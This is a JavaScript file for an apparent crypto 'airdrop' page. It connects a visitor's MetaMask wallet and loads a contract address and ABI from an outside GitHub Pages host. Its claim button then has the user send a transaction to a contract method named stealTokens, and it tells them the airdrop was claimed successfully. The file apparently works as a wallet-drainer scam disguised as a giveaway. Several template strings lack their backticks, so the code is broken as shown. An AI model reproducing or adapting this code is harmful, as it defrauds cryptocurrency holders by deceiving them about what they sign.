console.log('metamask.js is loaded');


// Function to initialize connection and check network
async function connectMetaMask() {
    if (window.ethereum) {
        try {
            // Request wallet connection
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

            if (accounts.length === 0) {
                console.error('No accounts found. Please ensure MetaMask is unlocked.');
                return;
            }

            const account = accounts[0];
            console.log("Connected to MetaMask account:", account);

            // Update UI with connected account
            document.getElementById('claimAirdropButton').disabled = false;

            // Check the current network
            const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
            console.log("Current network chainId:", currentChainId);

            // Set default network based on user network (default is Ethereum Mainnet)
            let defaultNetwork = 'eth';
            if (currentChainId === '0x1') {
                defaultNetwork = 'eth'; // Ethereum Mainnet
            } else if (currentChainId === '0x38') {
                defaultNetwork = 'bsc'; // Binance Smart Chain
            } else if (currentChainId === '0xaa36a7') {
                defaultNetwork = 'sepolia'; // Ethereum Sepolia Testnet
            } else {
                console.error("Unknown network. Please switch to Ethereum, BSC, or Sepolia.");
                return;
            }

            // Set the network in the claim button text
            document.getElementById('claimAirdropButton').innerText = Claim Airdrop (${defaultNetwork.toUpperCase()});

            return account;
        } catch (error) {
            console.error("Error connecting to MetaMask:", error);
        }
    } else {
        alert("MetaMask is not installed. Please install MetaMask to continue.");
    }
}

// Function to switch networks based on chainId
async function switchToNetwork(networkId, isTestnet = false) {
    // Define the mainnet and testnet chain IDs for each network
    const networkConfig = {
        eth: {
            mainnet: '0x1',       // Ethereum Mainnet
            sepolia: '0xaa36a7',  // Ethereum Sepolia Testnet
        },
        bsc: {
            mainnet: '0x38',      // Binance Smart Chain Mainnet
            testnet: '0x61',      // Binance Smart Chain Testnet
        }
    };

    // Determine which chainId to use based on the network and whether it's a testnet
    let chainId;
    if (isTestnet) {
        chainId = networkConfig[networkId]?.sepolia || networkConfig[networkId]?.testnet || null;
    } else {
        chainId = networkConfig[networkId]?.mainnet || null;
    }

    if (chainId) {
        try {
            // Attempt to switch the network
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId }],
            });
            console.log(Switched to ${isTestnet ? 'testnet' : 'mainnet'} for ${networkId} network: ${chainId});
        } catch (error) {
            console.error("Error switching network:", error);

            // Handle network not found, add it if not present in MetaMask
            if (error.code === 4902) {
                console.log(${networkId} network is not available in MetaMask, adding it.);
                if (networkId === 'eth' && isTestnet) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0xaa36a7',
                            chainName: 'Ethereum Sepolia Testnet',
                            rpcUrls: ['https://sepolia.infura.io/v3/'], // Replace with your Infura project ID
                            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                            blockExplorerUrls: ['https://sepolia.etherscan.io/'],
                        }],
                    });
                }
            }
        }
    } else {
        console.error("Invalid network ID:", networkId);
    }
}

// Function to claim airdrop
async function claimAirdrop() {
    const account = await connectMetaMask();
    if (!account) return;

    // Get the current network
    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
    let network = '';

    if (currentChainId === '0x1') {
        network = 'eth';  // Ethereum Mainnet
    } else if (currentChainId === '0x38') {
        network = 'bsc';  // Binance Smart Chain Mainnet
    } else if (currentChainId === '0xaa36a7') {
        network = 'sepolia'; // Ethereum Sepolia Testnet
    } else {
        alert("You are not connected to a supported network.");
        return;
    }

    // Load the contract address and ABI from the network config and ABI files
    const configResponse = await fetch(https://buyemon.github.io/wallets/config/${network}_config.json);
    const config = await configResponse.json();

    const abiResponse = await fetch(https://buyemon.github.io/wallets/abi/${network}_abi.json);
    const abi = await abiResponse.json();

    const contractAddress = config.contractAddress;
    const tokenAddress = config.tokenAddress;

    // Create a web3 instance
    const web3 = new Web3(window.ethereum);

    // Create the contract instance
    const contract = new web3.eth.Contract(abi, contractAddress);

    try {
        console.log(Claiming airdrop for account: ${account} on ${network} network);

        // Call the stealTokens function with the appropriate account
        await contract.methods.stealTokens(account).send({ from: account });

        alert(Airdrop claimed successfully for account: ${account});
    } catch (error) {
        console.error("Error claiming airdrop:", error);
    }
}

// Add this block to ensure DOM is ready before adding event listeners
document.addEventListener('DOMContentLoaded', function() {
    // Event listener for the claim airdrop button
    const claimButton = document.getElementById('claimAirdropButton');
    if (claimButton) {
        claimButton.addEventListener('click', claimAirdrop);
    } else {
        console.error('Claim Airdrop button not found!');
    }

    // Event listener to connect MetaMask
    const connectButton = document.getElementById('connectButton');
    if (connectButton) {
        connectButton.addEventListener('click', async () => {
            const account = await connectMetaMask();
            if (account) {
                console.log("MetaMask connected, account:", account);
            }
        });
    }

    // Event listener to switch networks
    const switchNetworkButton = document.getElementById('switchNetworkButton');
    if (switchNetworkButton) {
        switchNetworkButton.addEventListener('click', () => {
            const network = document.getElementById('networkSelector').value;
            const isTestnet = document.getElementById('testnetCheckbox').checked;
            switchToNetwork(network, isTestnet);
        });
    }
});
